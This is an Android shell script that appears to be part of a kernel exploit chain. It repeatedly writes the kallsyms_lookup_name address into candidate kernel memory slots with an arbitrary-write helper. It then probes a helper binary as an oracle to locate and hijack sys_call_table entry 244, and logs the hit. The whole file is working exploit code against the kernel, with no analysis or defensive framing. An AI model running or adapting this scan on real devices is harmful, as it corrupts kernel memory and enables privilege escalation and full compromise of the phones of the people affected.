#!/system/bin/sh
# Scan for sys_call_table[244] using the clean kallsyms_lookup_name oracle.
# Write KLN pointer to a candidate; if slot 244 lands in the table,
# `kfunc_new sym memcpy` returns a real kernel address instead of -1.
D=/data/local/tmp
GW=$D/gaw64
KF=$D/kfunc_new
KLN=ffffffc00111e5d0
LOG=$D/scan_oracle.log
START=2092000
END=21cd000

: > $LOG
cur=$START
while [ $((16#$cur)) -lt $((16#$END)) ]; do
  P=$(printf '%x' $((0x$cur + 0x7a0)))
  echo "try $cur slot=$P" >> $LOG
  $GW $P $KLN >/dev/null 2>&1
  R=$($KF sym memcpy 2>/dev/null | tail -1)
  echo "  -> $R" >> $LOG
  case "$R" in
    *memcpy*=0xffffffffffffffff*) ;;
    *memcpy*=0x*)
      A=$(echo "$R" | sed 's/.*=0x\([0-9a-f]*\).*/\1/')
      echo "HIT slot=$P memcpy=0x$A" >> $LOG
      echo "HIT slot=$P memcpy=0x$A"
      exit 0
      ;;
    '') echo "DEAD at $cur" >> $LOG; exit 3;;
  esac
  cur=$(printf '%x' $((0x$cur + 0x1000)))
done
echo "DONE no hit" >> $LOG
echo "DONE no hit"
exit 2
